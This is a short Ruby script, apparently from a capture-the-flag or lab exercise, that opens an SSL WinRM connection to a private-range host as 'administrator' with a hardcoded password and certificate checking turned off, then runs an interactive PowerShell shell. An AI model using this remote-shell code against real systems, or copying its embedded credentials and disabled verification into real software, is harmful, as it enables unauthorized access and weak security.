require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.11.152:5986/wsman',
  transport: :ssl,
  user: 'administrator',
  password: 'F9E(Y(U.k7hX@+@z8%6XT5+8',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
